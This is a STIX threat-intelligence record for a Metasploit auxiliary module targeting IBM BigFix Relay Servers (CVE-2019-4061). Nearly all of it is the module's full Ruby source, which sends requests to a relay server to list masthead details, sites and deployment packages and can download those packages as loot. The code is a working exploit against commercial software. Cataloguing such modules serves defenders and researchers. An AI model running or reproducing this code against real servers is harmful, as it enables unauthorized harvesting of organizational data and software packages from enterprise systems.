{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93532869-3524-43a8-9d86-4c11c346f8dd",
    "created": "2024-08-14T16:32:07.620046Z",
    "modified": "2024-08-14T16:32:07.62005Z",
    "name": "IBM BigFix Relay Server Sites and Package Enum",
    "description": " This module retrieves masthead, site, and available package information from IBM BigFix Relay Servers. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ibm_bigfix_sites_packages_enum.rb",
            "external_id": "ibm_bigfix_sites_packages_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'  => 'IBM BigFix Relay Server Sites and Package Enum',\n      'Description' => %q{\n        This module retrieves masthead, site, and available package information\n        from IBM BigFix Relay Servers.\n      },\n      'Author' =>\n        [\n          'HD Moore',       # Vulnerability Discovery\n          'Chris Bellows',  # Vulnerability Discovery\n          'Ryan Hanson',    # Vulnerability Discovery\n          'Jacob Robles'    # Metasploit module\n        ],\n      'References' =>\n        [\n          ['CVE','2019-4061'],\n          ['URL','https://www.atredis.com/blog/2019/3/18/harvesting-data-from-bigfix-relay-servers']\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 52311,\n          'SSL'   => true\n        },\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => '2019-03-18' # Blog post date\n    ))\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'Path to the BigFix server', '/']),\n      OptBool.new('SHOW_MASTHEAD', [true, 'Retrieve information from masthead file', true]),\n      OptBool.new('SHOW_SITES', [true, 'Retrieve site listing', true]),\n      OptBool.new('SHOW_PACKAGES', [true, 'Retrieve packages list', true]),\n      OptBool.new('DOWNLOAD', [true, 'Attempt to download packages', false])\n    ]\n\n    register_advanced_options [\n      OptBool.new('ShowURL', [true, 'Show URL instead of filename', false])\n    ]\n  end\n\n  def send_req(uri)\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri, uri)\n    })\n  end\n\n  def masthead\n    res = send_req('masthead/masthead.axfm')\n    return unless res && res.code == 200\n\n    if res.body =~ /Organization: (.*)./\n      print_good($1)\n    end\n\n    res.body.scan(/URL: (.*)./).each do |http|\n      print_good(http[0])\n    end\n  end\n\n  def sites\n    res = send_req('cgi-bin/bfenterprise/clientregister.exe?RequestType=FetchCommands')\n    return unless res && res.code == 200\n\n    print_status('Sites')\n    res.body.scan(/: ([^ ]+)/).each do |url|\n      print_good(url[0])\n    end\n  end\n\n  def packages\n    res = send_req('cgi-bin/bfenterprise/BESMirrorRequest.exe')\n    return unless res && res.code == 200\n\n    print_status('Packages')\n    last_action = nil\n    @files = {}\n\n    myhtml = res.get_html_document\n    myhtml.css('.indented p').each do |element|\n      element.children.each do |text|\n        if text.class == Nokogiri::XML::Text\n          next if text.text.start_with?('Error')\n\n          text.text =~ /^([^ ]+)/\n          case $1\n          when 'Action:'\n            # Save Action to associate URLs\n            text.text =~ /Action: ([0-9]+)/\n            last_action = $1\n            @files[last_action] = []\n            print_status(\"Action: #{last_action}\")\n          when 'url'\n            text.text =~ /^[^:]+: (.*)/\n            uri = URI.parse($1)\n            file = File.basename(uri.path)\n            @files[last_action].append(file)\n            datastore['ShowURL'] ? print_good(\"URL: #{$1}\") : print_good(\"File: #{file}\")\n          end\n        end\n      end\n    end\n  end\n\n  def download\n    print_status('Downloading packages')\n    @files.each do |action, val|\n      next if val.empty?\n      res = send_req(\"bfmirror/downloads/#{action}/0\")\n      next unless res && res.code == 200\n\n      print_status(\"Downloading file #{val.first}\")\n      res = send_req(\"bfmirror/downloads/#{action}/1\")\n      unless res && res.code == 200\n        print_error(\"Failed to download #{val.first}\")\n        next\n      end\n\n      myloot = store_loot('ibm.bigfix.package', File.extname(val.first), datastore['RHOST'], res.body, val.first)\n      print_good(\"Saved #{val.first} to #{myloot.to_s}\")\n    end\n  end\n\n  def run\n    masthead if datastore['SHOW_MASTHEAD']\n    sites if datastore['SHOW_SITES']\n    packages if datastore['SHOW_PACKAGES'] || datastore['DOWNLOAD']\n    download if datastore['DOWNLOAD'] && @files != {}\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-18 # Blog post date"
}